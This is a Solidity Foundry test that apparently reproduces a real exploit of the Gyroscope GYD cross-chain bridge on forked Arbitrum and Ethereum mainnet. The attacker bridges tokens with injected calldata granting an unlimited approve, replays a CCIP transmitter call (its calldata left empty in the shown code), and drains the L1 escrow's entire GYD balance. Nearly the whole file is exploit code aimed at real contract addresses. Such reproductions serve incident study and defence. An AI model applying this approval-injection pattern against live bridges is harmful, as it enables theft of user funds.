address constant attacker = address(0x7DD4075A6eAe9f18309F112364f0394C2DfA8102);
address constant transmitter = address(0x465Cb88B0Bf2A984a7C6c053262C8137D667bEaE);

address constant GYD = address(0xCA5d8F8a8d49439357d3CF46Ca2e720702F132b8);
address constant GYD_ETH = address(0xe07F9D810a48ab5c3c914BA3cA53AF14E4491e8A);
address constant EVM2EVMOffRamp = address(0xdf615eF8D4C64d0ED8Fd7824BBEd2f6a10245aC9);
address constant GYDL1CCIPESCROW = address(0xa1886c8d748DeB3774225593a70c79454B1DA8a6);



contract GyroscopePoC is BaseTest {
    function setUp() public {
        vm.createSelectFork("mainnet", 24350070 - 1);

        vm.label(address(GYD), "GYD Arbitrum");
        vm.label(address(attacker), "Attacker");
        vm.label(address(GYD_ETH), "GYD Ethereum");
        vm.label(address(transmitter), "CCIP Transmitter");
        vm.label(address(EVM2EVMOffRamp), "EVM2EVMOffRamp");
        fundingToken = GYD_ETH;
        beneficiary = attacker;
    }

    function testExploit() public balanceLog {
        vm.createSelectFork("arbitrum", 426912213);
        vm.startPrank(attacker, attacker);

        // Arbitrum -> Ethereum GYD Bridge
        bridgeGYD();

        vm.stopPrank();
        vm.createSelectFork("mainnet", 24350070 - 1);
        vm.startPrank(transmitter, transmitter);

        // Ethereum에서 bridge 처리 후 drain
        drainDstchain();
        vm.stopPrank();
        vm.startPrank(attacker, attacker);

        IERC20(GYD_ETH).allowance(GYDL1CCIPESCROW, attacker);
        IERC20(GYD_ETH).transferFrom(GYDL1CCIPESCROW, attacker, IERC20(GYD_ETH).balanceOf(GYDL1CCIPESCROW));
    }

    function bridgeGYD() public {
        uint64 dstchain = 5009297550715157269;
        bytes memory ex = abi.encodeWithSelector(IERC20.approve.selector, attacker, type(uint256).max);
        IGYD(GYD).bridgeToken{value: 0.000746483725476321 ether}(dstchain, GYD_ETH, 1, ex);
    }

    function drainDstchain() public {
        // Use exact calldata from original tx 0x45739a92c2d99f172a74d8028736a2fd1b507ac6fc134680cd1dccd3c572c600
        bytes memory callData = hex"";

        (bool success,) = EVM2EVMOffRamp.call(callData);
        require(success, "transmit failed");
    }
}


interface IGYD {
    function bridgeToken(
    uint64 destinationChainSelector,
    address recipient,
    uint256 amount,
    bytes memory data
  ) external payable;
}


interface ICCIPtransmitter{
      function transmit(
    bytes32[3] calldata reportContext,
    bytes calldata report,
    bytes32[] calldata rs,
    bytes32[] calldata ss,
    bytes32 rawVs // signatures
  ) external ;
}